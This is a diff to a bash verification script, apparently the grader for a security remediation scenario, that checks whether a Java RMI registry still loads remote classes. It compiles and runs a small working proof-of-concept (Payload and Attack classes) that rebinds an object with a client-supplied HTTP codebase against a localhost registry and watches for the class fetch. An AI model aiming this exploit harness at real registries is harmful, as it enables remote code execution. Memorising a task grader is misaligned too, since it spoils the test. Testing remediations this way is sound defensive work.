@@ -1,85 +1,173 @@
 #!/bin/bash
+# Scenario 33: Java RMI registry insecure default (useCodebaseOnly=false) ->
+# unauthenticated remote class loading / RCE (CVE-2011-3556 class).
+#
+# BEHAVIOURAL verifier. It does NOT grep java.security (useCodebaseOnly is a JVM
+# *system* property, not a security-properties entry, so a file edit proves
+# nothing) and it does NOT read the boot script. Instead it runs the real
+# exploit against the LIVE registry:
+#   1. Stand up a local HTTP "codebase" server hosting a remote interface class
+#      the registry does NOT have locally.
+#   2. rebind() an object annotated with that codebase into the registry.
+#   3. If the registry FETCHES the class over HTTP (a GET hits our server), it is
+#      loading remote code from a client-supplied URL -> useCodebaseOnly=false ->
+#      VULNERABLE.
+# With useCodebaseOnly=true the registry refuses the annotation, throws, and never
+# makes the HTTP request.
+#
+#   registry running, useCodebaseOnly=false -> GET observed  -> FAIL
+#   registry running, useCodebaseOnly=true  -> no GET         -> PASS
+#   config edited but JVM not restarted     -> GET observed  -> FAIL (old JVM)
+#
+# Exit 0 = remediated, Exit 1 = still vulnerable or broken.
 
-set -e
+set -u
 
-echo "=== Scenario 33: Java RMI Insecure Configuration Verification ==="
+HOST=127.0.0.1
+PORT=1099
+HTTP_PORT=18099
+WORK=$(mktemp -d)
+HTTP_PID=""
+cleanup() { [ -n "$HTTP_PID" ] && kill "$HTTP_PID" 2>/dev/null; rm -rf "$WORK"; }
+trap cleanup EXIT
 
-# Check 1: Verify RMI is either stopped OR secured with useCodebaseOnly=true
-RMI_RUNNING=$(ps aux | grep -v grep | grep rmiregistry || true)
-
-if [ -n "$RMI_RUNNING" ]; then
-    echo "RMI registry is running, verifying security configuration..."
-
-    # Check if it's running with secure flag
-    if echo "$RMI_RUNNING" | grep -q "useCodebaseOnly=true"; then
-        echo "OK: RMI registry is running with useCodebaseOnly=true (secured)"
-    else
-        # Check Java security configuration file
-        JAVA_SECURITY_FILE="/etc/java-6-openjdk/security/java.security"
-        if [ -f "$JAVA_SECURITY_FILE" ]; then
-            if grep -q "java.rmi.server.useCodebaseOnly.*=.*true" "$JAVA_SECURITY_FILE"; then
-                echo "OK: useCodebaseOnly=true set in Java security configuration"
-            else
-                echo "FAIL: RMI is running without useCodebaseOnly=true (vulnerable to RCE)"
-                exit 1
-            fi
-        else
-            echo "FAIL: Cannot verify RMI security configuration"
-            exit 1
-        fi
-    fi
-else
-    echo "OK: RMI registry is not running (service disabled)"
+###############################################################################
+# Liveness: the registry must already be running. verify.sh must NEVER start it.
+###############################################################################
+if ! pgrep -f rmiregistry >/dev/null 2>&1; then
+    echo "FAIL [Regression]: rmiregistry is not running — a dead registry is a" >&2
+    echo "                   failure (verify.sh must not start it)." >&2
+    exit 1
 fi
-
-# Behavioral test: verify the security property is active at runtime
-if [ -n "$RMI_RUNNING" ]; then
-    # Check the actual JVM system property via /proc cmdline
-    for PID in $(pgrep -f rmiregistry 2>/dev/null); do
-        CMDLINE=$(cat /proc/$PID/cmdline 2>/dev/null | tr '\0' ' ')
-        if echo "$CMDLINE" | grep -q "useCodebaseOnly=false"; then
-            echo "FAIL: RMI process $PID running with useCodebaseOnly=false (runtime behavioral test)"
-            exit 1
-        fi
-    done
-    echo "OK: No RMI process found with useCodebaseOnly=false at runtime (behavioral test)"
-fi
-
-# Check 2: If RMI port is listening, verify it's restricted or secured
-if netstat -ln 2>/dev/null | grep -q ":1099 "; then
-    echo "WARNING: Port 1099 is listening"
-
-    # Check if it's bound to localhost only (more secure)
-    if netstat -ln | grep ":1099 " | grep -q "127.0.0.1:1099"; then
-        echo "OK: RMI port 1099 is bound to localhost only"
-    elif netstat -ln | grep ":1099 " | grep -q "0.0.0.0:1099\|:::1099"; then
-        # Listening on all interfaces - check if firewall is configured
-        if command -v iptables >/dev/null 2>&1; then
-            if iptables -L INPUT -n 2>/dev/null | grep -q "dpt:1099.*DROP\|dpt:1099.*REJECT"; then
-                echo "OK: Firewall blocks external access to port 1099"
-            else
-                echo "WARNING: RMI listening on all interfaces without apparent firewall protection"
-            fi
-        fi
-    fi
-else
-    echo "OK: Port 1099 is not listening (RMI disabled)"
-fi
-
-# Check 3: Verify system is otherwise operational - SSH should work
-if ! netstat -ln | grep -q ":22 "; then
-    echo "FAIL: SSH port 22 is not listening (system may be broken)"
+if ! netstat -ln 2>/dev/null | grep -qE ':1099( |$)'; then
+    echo "FAIL [Regression]: nothing listening on port 1099." >&2
     exit 1
 fi
 
-echo "OK: SSH port 22 is listening"
-
-if ! ps aux | grep -v grep | grep -q sshd; then
-    echo "FAIL: SSH daemon is not running"
+###############################################################################
+# Build the exploit + a legitimate client.
+###############################################################################
+cat > "$WORK/PayloadIntf.java" <<'EOF'
+import java.rmi.Remote; import java.rmi.RemoteException;
+public interface PayloadIntf extends Remote { String go() throws RemoteException; }
+EOF
+cat > "$WORK/Payload.java" <<'EOF'
+import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject;
+public class Payload extends UnicastRemoteObject implements PayloadIntf {
+    public Payload() throws RemoteException { super(); }
+    public String go() { return "pwn"; }
+}
+EOF
+cat > "$WORK/Attack.java" <<'EOF'
+import java.rmi.registry.*;
+public class Attack {
+    public static void main(String[] a) {
+        try {
+            Registry r = LocateRegistry.getRegistry(a[0], Integer.parseInt(a[1]));
+            r.rebind("evil", new Payload());
+            System.out.println("REBIND_OK");
+        } catch (Throwable t) {
+            System.out.println("REBIND_ERR:" + t.getClass().getName());
+        } finally { System.exit(0); }
+    }
+}
+EOF
+cat > "$WORK/Legit.java" <<'EOF'
+import java.rmi.registry.*;
+public class Legit {
+    public static void main(String[] a) {
+        try {
+            Registry r = LocateRegistry.getRegistry(a[0], Integer.parseInt(a[1]));
+            String[] n = r.list();
+            System.out.println("LIST_OK:" + n.length);
+        } catch (Throwable t) {
+            System.out.println("LIST_ERR:" + t.getClass().getName());
+        }
+    }
+}
+EOF
+if ! (cd "$WORK" && javac PayloadIntf.java Payload.java Attack.java Legit.java) 2>"$WORK/javac.err"; then
+    echo "FAIL [Regression]: could not compile exploit harness:" >&2
+    cat "$WORK/javac.err" >&2
     exit 1
 fi
 
-echo "OK: SSH daemon is running"
+###############################################################################
+# Wait for the registry to answer a legitimate list() before probing.
+###############################################################################
+UP=0
+for i in $(seq 1 15); do
+    L=$(cd "$WORK" && timeout 10 java -cp "$WORK" Legit "$HOST" "$PORT" 2>/dev/null)
+    if echo "$L" | grep -q 'LIST_OK'; then UP=1; break; fi
+    sleep 1
+done
+if [ "$UP" != "1" ]; then
+    echo "FAIL [Regression]: RMI registry did not answer a legitimate list() call —" >&2
+    echo "                   service is down or broken. last=$L" >&2
+    exit 1
+fi
 
-echo "=== PASS: RMI vulnerability remediated, system operational ==="
+###############################################################################
+# PoC: force the registry to load a remote class from our HTTP codebase.
+###############################################################################
+mkdir -p "$WORK/httpdir"
+cp "$WORK/PayloadIntf.class" "$WORK/Payload.class" "$WORK/httpdir/"
+( cd "$WORK/httpdir" && python -m SimpleHTTPServer "$HTTP_PORT" >"$WORK/http.log" 2>&1 ) &
+HTTP_PID=$!
+
+###############################################################################
+# POSITIVE CONTROL: the codebase HTTP server MUST actually be bound and serving
+# before "no class fetch" can be read as "safe". If SimpleHTTPServer never
+# started (port clash, python breakage, kill), http.log would stay empty and the
+# PoC below would trivially find no fetch — a false PASS while the registry is
+# still useCodebaseOnly=false. We fire a control GET at a SENTINEL path (distinct
+# from the payload class) and require the server to log it. Absence => ERROR/FAIL.
+###############################################################################
+SENTINEL="__cb_probe_$$__"
+CB_UP=0
+for i in $(seq 1 15); do
+    python - "$HTTP_PORT" "$SENTINEL" >/dev/null 2>&1 <<'PY'
+import sys, urllib
+port = sys.argv[1]; sentinel = sys.argv[2]
+try:
+    urllib.urlopen('http://127.0.0.1:%s/%s' % (port, sentinel)).read()
+except Exception:
+    pass
+PY
+    if grep -q "$SENTINEL" "$WORK/http.log" 2>/dev/null; then CB_UP=1; break; fi
+    sleep 1
+done
+if [ "$CB_UP" != "1" ]; then
+    echo "FAIL [Error]: the exploit's HTTP codebase server never bound port" >&2
+    echo "              ${HTTP_PORT} (no control GET logged) — cannot conclude the" >&2
+    echo "              registry is safe from a fetch that could never have happened." >&2
+    echo "              http.log:" >&2
+    tail -5 "$WORK/http.log" >&2 2>/dev/null
+    exit 1
+fi
+
+( cd "$WORK" && timeout 25 java -cp "$WORK" \
+    -Djava.rmi.server.codebase="http://127.0.0.1:${HTTP_PORT}/" \
+    Attack "$HOST" "$PORT" >"$WORK/attack.out" 2>&1 )
+sleep 2
+
+if grep -q 'PayloadIntf.class' "$WORK/http.log" 2>/dev/null; then
+    echo "FAIL [PoC]: registry fetched a remote class over HTTP from a client-supplied" >&2
+    echo "            codebase (useCodebaseOnly=false) — remote class loading / RCE live:" >&2
+    grep 'PayloadIntf.class' "$WORK/http.log" | head -1 >&2
+    exit 1
+fi
+echo "PASS [PoC]: registry refused to load remote code from the client codebase."
+
+###############################################################################
+# Regression: the registry still serves legitimate clients.
+###############################################################################
+L=$(cd "$WORK" && timeout 10 java -cp "$WORK" Legit "$HOST" "$PORT" 2>/dev/null)
+if ! echo "$L" | grep -q 'LIST_OK'; then
+    echo "FAIL [Regression]: RMI registry no longer answers legitimate list(). got=$L" >&2
+    exit 1
+fi
+echo "PASS [Regression]: RMI registry still serves legitimate clients ($L)."
+
+echo "All checks passed."
 exit 0
